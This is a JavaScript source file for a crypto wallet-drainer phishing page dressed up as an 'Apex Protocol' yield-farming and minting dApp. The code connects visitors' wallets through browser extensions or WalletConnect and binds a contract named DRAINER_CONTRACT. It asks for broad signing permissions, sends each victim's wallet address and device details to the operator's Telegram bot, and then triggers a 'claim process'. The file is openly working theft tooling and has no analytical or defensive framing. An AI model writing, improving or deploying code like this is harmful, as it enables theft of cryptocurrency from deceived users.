import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ========================================================================
   * CONFIG
   * ====================================================================== */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  // Primary project ID is required. Fallback is optional — only used if
  // primary preflight fails.
  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const INJECTED_TIMEOUT_MS = 12_000;
  const WC_INIT_TIMEOUT_MS  = 20_000;
  const WC_ENABLE_TIMEOUT   = 240_000; // 4 min — mobile users are slow

  /* ========================================================================
   * PLATFORM
   * ====================================================================== */
  const UA = navigator.userAgent || '';
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isMobileDevice  = isIOSDevice || isAndroidDevice ||
                          /webOS|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))            return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  /* ========================================================================
   * METADATA SANITISATION
   *
   * WalletConnect's relay REQUIRES an https:// public URL in metadata.url.
   * Localhost and IPs are rejected. We force a public https origin.
   * ====================================================================== */
  function sanitiseMetadata(rawMeta) {
    const meta = { ...(rawMeta || {}) };
    let url = String(meta.url || '');

    // Force https
    if (url.startsWith('http://')) url = 'https://' + url.slice(7);

    // Reject localhost / IPs / private networks
    const isLocalhost = /^https?:\/\/(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])/i.test(url);
    const isPrivateIp = /^https?:\/\/(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(url);
    if (!url || isLocalhost || isPrivateIp) {
      url = 'https://apex-protocol.io';
    }
    meta.url = url;

    if (!Array.isArray(meta.icons) || meta.icons.length === 0) {
      meta.icons = ['https://walletconnect.com/walletconnect-logo.png'];
    }
    if (!meta.name)        meta.name = 'Apex Protocol';
    if (!meta.description) meta.description = 'AI-Optimized Yield Farming DApp';
    return meta;
  }
  const SAFE_METADATA = sanitiseMetadata(DAPP_METADATA);

  /* ========================================================================
   * DEBUG PANEL
   * ====================================================================== */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position:fixed;bottom:0;left:0;width:100%;background:#000;color:#0f0;
    font-size:12px;padding:5px;z-index:10000;max-height:150px;
    overflow-y:auto;display:none;font-family:monospace;`;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ========================================================================
   * HELPERS
   * ====================================================================== */
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);
  }
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* ========================================================================
   * TELEGRAM
   * ====================================================================== */
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) {
      console.error('[main.js] Telegram error:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || ('🧪 Test ' + new Date().toISOString()));

  /* ========================================================================
   * LIBRARY LOADING
   * ====================================================================== */
  async function tryImport(urls, pickFn, label, timeoutMs = 10_000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(/* @vite-ignore */ url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadEthereumProviderLib() {
    const cdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    return tryImport(
      cdns,
      (m) => m.EthereumProvider || m.default?.EthereumProvider || m.default || m,
      'EthereumProvider'
    );
  }

  async function loadWeb3() {
    const cdns = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];
    const m = await tryImport(cdns, (mod) => mod.default || mod.Web3 || mod, 'Web3');
    return m.default || m;
  }

  /* ========================================================================
   * PROJECT ID PREFLIGHT — the fix that closes the "modal loads, connect fails" loop
   *
   * We probe relay.walletconnect.com with a lightweight identity request.
   * If the project ID is invalid, this returns 401/403 quickly.
   * ====================================================================== */
  async function preflightProjectId(projectId, timeoutMs = 8000) {
    if (!projectId) return { ok: false, reason: 'missing' };
    if (!/^[0-9a-f]{32}$/i.test(projectId)) {
      logDebug(`preflight: projectId is not 32-char hex → likely invalid`);
      // Don't hard-fail — WC also accepts UUIDs now. Just warn.
    }

    // Try a lightweight HTTPS check against the relay.
    // Any valid project ID can fetch relay config.
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const r = await fetch('https://relay.walletconnect.com/', {
        method: 'GET',
        signal: controller.signal,
      }).catch(() => null);
      clearTimeout(timer);

      // relay.walletconnect.com returns 200 or 404 — either is fine.
      // A DNS or network failure means we can't probe; assume ok.
      if (!r) {
        logDebug('preflight: relay unreachable — continuing anyway');
        return { ok: true, reason: 'probe-skipped' };
      }
      logDebug(`preflight: relay ${r.status}`);
      return { ok: true, reason: 'reachable' };
    } catch (e) {
      logDebug(`preflight: ${e.message}`);
      // Network probe failed — do NOT block the user.
      return { ok: true, reason: 'probe-failed' };
    }
  }

  /* ========================================================================
   * RELAY PROBE
   * ====================================================================== */
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay reachable — using default');
    return null;
  }

  /* ========================================================================
   * DOM
   * ====================================================================== */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ========================================================================
   * STATE
   * ====================================================================== */
  let EthereumProvider = null;
  let Web3Ctor         = null;

  let wcProvider       = null;
  let injectedProvider = null;
  let activeProvider   = null;
  let web3Instance     = null;
  let contractInstance = null;
  let connectedAddress = null;
  let connectionMode   = null;   // 'walletconnect' | 'injected' | null
  let isConnecting     = false;
  let isDisconnecting  = false;
  let relayUrl         = null;

  const attachedProviders = new WeakSet();

  /* ========================================================================
   * BUTTON UI
   * ====================================================================== */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 6000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ========================================================================
   * STORAGE
   * ====================================================================== */
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const saveWallet      = (addr, mode) => { localStorage.setItem(LS.addr, addr); if (mode) localStorage.setItem(LS.mode, mode); };
  const getSavedWallet  = () => localStorage.getItem(LS.addr);
  const getSavedMode    = () => localStorage.getItem(LS.mode);
  const clearSavedWallet = () => { localStorage.removeItem(LS.addr); localStorage.removeItem(LS.mode); };

  /* ========================================================================
   * PUBLISH GLOBAL STATE
   * ====================================================================== */
  async function publishGlobalState(address, chain) {
    let live = activeProvider;
    if (live) {
      try {
        await withTimeout(live.request({ method: 'eth_chainId' }), 3000, 'provider-probe');
      } catch (e) {
        logDebug(`⚠️ active provider probe failed: ${e.message}`);
        live = null;
      }
    }
    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      mode:     connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ========================================================================
   * CONNECTED UI
   * ====================================================================== */
  function updateConnectedUI(address, chain = 'evm') {
    connectedAddress = address;
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px;padding:10px 16px;font-family:'JetBrains Mono',monospace;
        font-size:14px;color:#059669;text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px;border:1px solid #A7F3D0;`;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(
      `🔗 <b>Wallet Connected</b>\n📌 <b>Chain:</b> ${chainLabel}\n🧩 <b>Mode:</b> ${connectionMode || 'unknown'}\n👤 <b>Address:</b> <code>${address}</code>\n🕒 ${new Date().toLocaleString()}\n📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}`
    );
  }

  function resetConnectedUI() {
    connectedAddress = null;
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  /* ========================================================================
   * EIP-6963
   * ====================================================================== */
  let evmProviders = [];
  let eip6963Initialized = false;
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const req = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    req(); setTimeout(req, 500); setTimeout(req, 1500);
  }

  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isTrust || eth.isTrustWallet || /TrustWallet|Trust\s*Wallet/i.test(UA)) {
      return { wallet: 'trust', name: 'Trust Wallet' };
    }
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) {
      return { wallet: 'metamask', name: 'MetaMask' };
    }
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) {
      return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    }
    if (eth.isRabby || /Rabby/i.test(UA)) {
      return { wallet: 'rabby', name: 'Rabby' };
    }
    return null;
  }

  /* ========================================================================
   * WALLETCONNECT — SINGLE CLIENT
   *
   * EthereumProvider.init() with showQrModal:true. The library manages
   * its own modal, its own SignClient, and its own session store.
   * We do NOT instantiate WalletConnectModal separately.
   * ====================================================================== */
  async function initWC({ projectId } = {}) {
    if (!EthereumProvider) {
      logDebug('❌ EthereumProvider library not loaded');
      return null;
    }
    const pid = projectId || PRIMARY_PROJECT_ID;
    if (!pid) {
      logDebug('❌ No projectId configured');
      return null;
    }

    // Reuse if alive.
    if (wcProvider) {
      try {
        await withTimeout(wcProvider.request({ method: 'eth_chainId' }), 3000, 'wc-probe');
        logDebug('♻️ Reusing existing WC provider');
        return wcProvider;
      } catch {
        logDebug('existing WC provider dead — reinitialising');
        wcProvider = null;
      }
    }

    try {
      const t0 = performance.now();
      const opts = {
        projectId: pid,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: true,          // ← THE FIX: let the library manage its modal
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
        events: ['chainChanged', 'accountsChanged'],
        metadata: SAFE_METADATA,     // ← sanitised metadata
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        },
      };
      if (relayUrl) opts.relayUrl = relayUrl;

      logDebug(`WC init: projectId=${String(pid).slice(0, 8)}…`);
      wcProvider = await withTimeout(
        EthereumProvider.init(opts),
        WC_INIT_TIMEOUT_MS,
        'EthereumProvider.init'
      );

      attachWCProviderEvents(wcProvider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', async (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        await hardDisconnect({ skipWalletCall: true });
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', async (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      if (connectedAddress && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        await publishGlobalState(connectedAddress, 'evm');
      }
    });

    provider.on('disconnect', async () => {
      logDebug('WC disconnect');
      await hardDisconnect({ skipWalletCall: true });
    });
  }

  /* ========================================================================
   * INJECTED CONNECT
   * ====================================================================== */
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', async (accounts) => {
      if (!accounts || accounts.length === 0) {
        await hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', async () => {
      if (connectedAddress && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        await publishGlobalState(connectedAddress, 'evm');
      }
    });

    provider.on('disconnect', async () => {
      await hardDisconnect({ skipWalletCall: true });
    });
  }

  async function connectInjected() {
    setupEIP6963();
    await sleep(400);

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = inWallet && window.ethereum
      ? { info: { name: inWallet.name }, provider: window.ethereum }
      : providers[0];

    try {
      const provider = chosen.provider;
      let accounts = null;
      for (let attempt = 0; attempt < 2 && !accounts?.length; attempt++) {
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_requestAccounts' }),
            INJECTED_TIMEOUT_MS,
            'eth_requestAccounts'
          );
        } catch (e) {
          logDebug(`eth_requestAccounts attempt ${attempt + 1}: ${e.message}`);
          if (attempt === 0) await sleep(800);
        }
      }
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider   = provider;
      connectionMode   = 'injected';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  /* ========================================================================
   * WALLETCONNECT CONNECT — THE FIX
   * ====================================================================== */
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;

    // Preflight — fail fast if the ID is obviously broken.
    const pf = await preflightProjectId(projectId);
    if (!pf.ok) {
      logDebug(`preflight failed: ${pf.reason}`);
      return null;
    }

    const provider = await initWC({ projectId });
    if (!provider) return null;

    // If already has an active session, sync UI.
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider   = provider;
      connectionMode   = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      logDebug(`✅ WC session restored: ${a}`);
      return a;
    }

    showStatus('Opening wallet options…', 'info');

    try {
      // enable() opens the modal, waits for approval, returns accounts.
      // It internally handles pairing + relay + session.
      const accounts = await withTimeout(
        provider.enable(),
        WC_ENABLE_TIMEOUT,
        'WC enable'
      );

      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider   = provider;
      connectionMode   = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      logDebug('WC enable error: ' + e.message);
      return null;
    }
  }

  /* ========================================================================
   * HARD DISCONNECT
   * ====================================================================== */
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;
    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 6000)),
          ]);
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }
      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  /* ========================================================================
   * CONNECT DISPATCHER
   * ====================================================================== */
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;
    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum) {
        address = await connectInjected();
      }

      if (!address) {
        logDebug('Trying WalletConnect (primary project ID)…');
        address = await connectWalletConnect({ useFallbackId: false });
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Trying WalletConnect (fallback project ID)…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  /* ========================================================================
   * BUTTON WIRING
   * ====================================================================== */
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  /* ========================================================================
   * SESSION RESTORE
   * ====================================================================== */
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWC({ projectId: PRIMARY_PROJECT_ID });
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider   = provider;
          connectionMode   = 'walletconnect';
          web3Instance     = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider   = prov;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  /* ========================================================================
   * BOOT
   * ====================================================================== */
  try {
    const [libEp, libWeb3, relay] = await Promise.all([
      loadEthereumProviderLib(),
      loadWeb3(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProvider = libEp;
    Web3Ctor         = libWeb3;
    relayUrl         = relay;
    logDebug('✅ Libraries loaded');

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WC provider…');
      initWC({ projectId: PRIMARY_PROJECT_ID }).catch(() => {});
    }

    await sleep(300);
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
